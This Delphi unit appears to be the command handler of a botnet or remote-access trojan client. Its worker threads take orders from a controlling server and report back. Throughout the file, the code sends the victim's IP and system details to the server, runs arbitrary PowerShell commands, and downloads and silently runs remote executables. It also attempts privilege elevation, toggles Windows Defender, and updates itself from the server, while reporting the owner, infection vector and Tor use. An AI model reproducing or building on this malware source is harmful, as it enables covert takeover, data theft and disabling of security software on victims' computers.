unit CommandUnit;

{
  This unit handles the currently active command threads,
  and hosts/manipulates the thread pool. It also contains
  functions designed to check the status or existence of said
  command threads.
}

interface

uses
  Windows, System.SysUtils, System.Classes, Generics.Collections,
  SystemUnit, ElevateUnit, Basics, DProcess;

type
  ///  <summary>A class responsible for executing commands and sending the results to the server</summary>
  TWorker = class(TThread)
  protected
    ///  <summary>Identifier of the current command</summary>
    FID: Int64;
    ///  <summary>Type of command</summary>
    FCommand: String;
    ///  <summary>Array of parameters passed to the command</summary>
    FParams: TStringList;
  public
    constructor Create(ID: Int64; Command: String; Params: TStringList);
    destructor Destroy; override;
    procedure Execute; override;

    property ID: Int64 read FID;
    property Command: String read FCommand;
  end;

  ///  <summary>List that stores a references to the currently active Workers</summary>
  TWorkerList = TObjectList<TWorker>;

///  <summary>Sets the Terminate flag of the given command</summary>
procedure AbortCommand(Params: TStringList; ID: Int64);
///  <returns>A reference to the Worker associated with the given command</returns>
function FindWorker(ID: Int64): TWorker;
///  <returns>True if the specified command is being executed by a Worker</returns>
function IsRunning(ID: Int64): Boolean;
///  <summary>Frees the memory of Workers that have finished</summary>
procedure CleanUp;

const
  R_SUCCESS = 'Command completed successfully.';
  R_ATTEMPT = 'Attempt initiated.';
  R_UNINST = 'Uninstall initiated.';
  R_ABORT = 'Abort successful.';
  E_GENERIC = 'Unknown error encountered.';
  E_ABORT = 'No such command.';

var
  Workers: TWorkerList;

implementation

uses
  NetUnit, BotUnit; // BotUnit in main "uses" causes Out of memory error
{ TODO -cImprovement : Find a way to get rid of this circular reference }

procedure AddVal(var S: String; const N, V: String);
Begin
  S := S + #10 + N + ' --> ' + V;
End;

function BoolToInt(A: Boolean): Byte;
Begin
  if A then
    Result := 1
  else
    Result := 0;
End;

function GetRunningCommands: String;
var
  I: Integer;
Begin
  Result := '';
  for I := 0 to Workers.Count - 1 do
  Begin
    if (Not(Workers[I].Finished)) then
      Result := Result + IntToStr(Workers[I].ID) + '-' + Workers[I]
        .Command + ', ';
  End;
  if Result <> '' then
    Delete(Result, Length(Result) - 1, 2);
End;

function FindWorker(ID: Int64): TWorker;
var
  I: LongInt;
Begin
  Result := Nil;
  for I := 0 to Workers.Count - 1 do
    if Workers.Items[I].ID = ID then
    Begin
      Result := Workers.Items[I];
      Exit;
    End;
End;

function IsRunning(ID: Int64): Boolean;
var
  W: TWorker;
Begin
  W := FindWorker(ID);
  if Assigned(W) then
    Result := Not(W.Finished)
  else
    Result := False;
End;

procedure AbortCommand(Params: TStringList; ID: Int64);
var
  W: TWorker;
Begin
  W := FindWorker(StrToInt64(Params.Values['id']));
  if Assigned(W) then
  Begin
    W.Terminate;
    Net.SendResponse(R_ABORT, ID);
    Dbg('Aborted [' + Params.Values['id'] + '] ' + W.Command + '.', dHigh);
  End
  else
  Begin
    Net.SendResponse(E_ABORT, ID);
  End;
  Params.Free;
End;

procedure CleanUp;
var
  I: LongInt;
Begin
  I := 0;
  while I < Workers.Count do
  Begin
    if Workers[I].Finished then
    Begin
      Dbg('Thread #' + IntToStr(I) + ' (' + Workers[I].Command + ') freed.');
      Workers.Delete(I);
      Dec(I);
    End;
    Inc(I);
  End;
End;

constructor TWorker.Create(ID: Int64; Command: String; Params: TStringList);
begin
  inherited Create(False);
  FID := ID;
  FCommand := Command;
  FParams := Params;
end;

procedure TWorker.Execute;
var
  A: TStringList;
  S: String;
  P: AnsiString;
begin
  try
    if FCommand = 'Register' then
    Begin
      A := TStringList.Create;
      // Add client specific info
      A.AddPair('IP', Net.GetIP);
      // Add system info
      SystemUnit.GetSystemInfo(A);
      Net.SendResponse(A, FID);
      A.Free;
    End
    else if FCommand = 'Power' then
    Begin
      if SystemUnit.Power(FParams.Values['mode']) then
        Net.SendResponse(R_SUCCESS, FID)
      else
        Net.SendResponse(E_GENERIC, FID);
    End
    else if FCommand = 'BotInfo' then
    Begin
      S := 'Name --> ' + Options.Name;
      AddVal(S, 'Base', Options.BaseDir);
      AddVal(S, 'Owner', Options.Owner);
      AddVal(S, 'Vector', Options.Method);
      AddVal(S, 'Version', Options.Version);
      AddVal(S, 'Tor', BoolToStr(Options.Tor, True));
      AddVal(S, 'Process', ExtractFileName(ParamStr(0)));
      AddVal(S, 'Defender', BoolToStr(IsDefenderEnabled, True));
      AddVal(S, 'Admin', BoolToStr(IsUserAnAdmin, True));
      AddVal(S, 'Commands', GetRunningCommands);
      Net.SendResponse(S, FID);
    End
    else if FCommand = 'Execute' then
    Begin
      if FParams.Values['mode'] = 'Command' then
      Begin
        try
          RunCommand('powershell', ['-Command "' + FParams.Values['command'] +
            '"'], P, [poStderrToOutput]);
        except
          P := E_GENERIC;
        end;
        Net.SendResponse(String(P), FID);
      End
      else if FParams.Values['mode'] = 'Local' then
      Begin
        if FileExists(FParams.Values['file']) then
        Begin
          Basics.Execute(FParams.Values['file'], [],
            FParams.Values['hide'] = 'True', FParams.Values['wait'] = 'True');
          Net.SendResponse(R_SUCCESS, FID);
        End
        else
          Net.SendResponse(E_GENERIC, FID);
      End
      else
      Begin
        S := IntToStr(FID) + '.tmp';
        if Net.DownloadFile(FParams.Values['file'], S) then
        Begin
          Basics.Execute(S, [], FParams.Values['hide'] = 'True',
            FParams.Values['wait'] = 'True');
          Net.SendResponse(R_SUCCESS, FID);
        End
        else
          Net.SendResponse(E_GENERIC, FID);
        DeleteFile(S);
      End;
    End
    else if FCommand = 'Elevate' then
    Begin
      Net.SendResponse(R_ATTEMPT, FID);
      ElevateUnit.Elevate(TElevationType(StrToInt(FParams.Values['mode'])));
    End
    else if FCommand = 'Defender' then
    Begin
      if EnableDefender(FParams.Values['enable'] = 'True') then
        Net.SendResponse(R_SUCCESS, FID)
      else
        Net.SendResponse(E_GENERIC, FID);
    End
    else if FCommand = 'Restart' then
    Begin
      Net.SendResponse(R_ATTEMPT, FID);
      Restart('', True);
    End
    else if FCommand = 'Update' then
    Begin
      Allowed := False;
      S := IncludeTrailingPathDelimiter(GetEnvironmentVariable('Temp')) +
        'Tempdl.tmp';
      if Net.DownloadFile(FParams.Values['file'], S) then
      Begin
        S := ExtractFilePath(S) + 'New.exe';
        RenameFile(ExtractFilePath(S) + 'Tempdl.tmp', S);
        Net.SendResponse(R_ATTEMPT, FID);
        Update(S);
      End
      else
        Net.SendResponse(E_GENERIC, FID);
    End
    else if FCommand = 'Uninstall' then
    Begin
      Allowed := False;
      Net.SendResponse(R_UNINST, FID);
      Uninstall;
    End
    else if FCommand = 'MessageBox' then
    Begin
      MessageBox(GetForegroundWindow, PChar(FParams.Values['text']),
        PChar(FParams.Values['caption']),
        BoolToInt(FParams.Values['critical'] = 'True') * MB_ICONERROR);
      Net.SendResponse(R_SUCCESS, FID);
    End
    else
      Net.SendResponse(E_ABORT, FID);
  except
    on E: Exception do
      Dbg('Thread Error ' + E.ClassName + ': ' + E.Message, dError);
  end;
end;

destructor TWorker.Destroy;
Begin
  FParams.Free;
  inherited;
End;

end.
